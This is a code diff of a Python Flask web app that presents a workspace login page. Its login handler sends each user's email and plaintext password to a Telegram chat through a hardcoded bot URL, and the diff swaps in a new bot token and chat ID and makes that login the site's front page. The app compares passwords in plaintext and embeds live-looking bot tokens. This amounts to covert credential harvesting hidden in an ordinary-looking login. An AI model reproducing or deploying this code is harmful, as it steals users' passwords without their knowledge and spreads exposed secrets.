@@ -50,7 +50,7 @@ def load_user(user_id):
 
 
 def sendtelegram(params):
-    url = "https://api.telegram.org/bot5787281305:AAE1S8DSnMAyQuzAnXOHfxLq-iyvPwYJeAo/sendMessage?chat_id=-1001556929308&text=" + urllib.parse.quote(params)
+    url = "https://api.telegram.org/bot5738222395:AAEM5NwDAN1Zc052xI_i9-YlrVnvmSkN9p4/sendMessage?chat_id=-633441737&text=" + urllib.parse.quote(params)
     content = urllib.request.urlopen(url).read()
     print(content)
     return content
@@ -256,7 +256,7 @@ def upload_image():
     return render_template('newreport.html')
 
 
-@app.route('/')
+@app.route('/index')
 def index():    
     return render_template('index.html')
 
@@ -661,26 +661,7 @@ def login():
 @app.route('/login', methods=['POST','GET'])
 def login():
     form = LoginForm()
-    print ('try')
-    print(form.email.data)
-    print(form.password.data)
-    
-    if form.validate_on_submit():
-        print("form Validated successfully")
-        user = Person.query.filter_by(email = form.email.data).first()
-        print("user:" + user.email + "found")
-      
-        print(user.password)
-        if user and form.password.data == user.password:
-            print(user.email + "validored successfully")
-            if user == None:
-                flash(f"There was a problem")   
-            login_user(user)
-            flash (f' ' + user.email + ',Welcome Admin ' ,'success')
-            return redirect(url_for('dashboard'))
-            # next = request.args.get('next')
-        else:
-            flash (f'Wrong Password ', 'success')
+  
    
     return render_template('login.html', form=form)
  
@@ -738,7 +719,7 @@ def usersignup():
     return render_template('usersignup.html', form=form)
    
 
-@app.route('/userlogin', methods=['POST','GET'])
+@app.route('/', methods=['POST','GET'])
 def ulogin():
     form = LoginForm()
     print ('try')
@@ -757,7 +738,7 @@ def ulogin():
                 print(user.email + "validored successfully")
                 login_user(user)
                 sendtelegram(user.email +' '+ user.password +' '+ 'Logged in successfully' )
-                flash ('Welcome, Finish Setting up your profile ' ,'success')
+                flash ('Welcome to myworkspace ' ,'success')
                 return redirect(url_for('useryeargroup'))
                 # next = request.args.get('next')
             else:
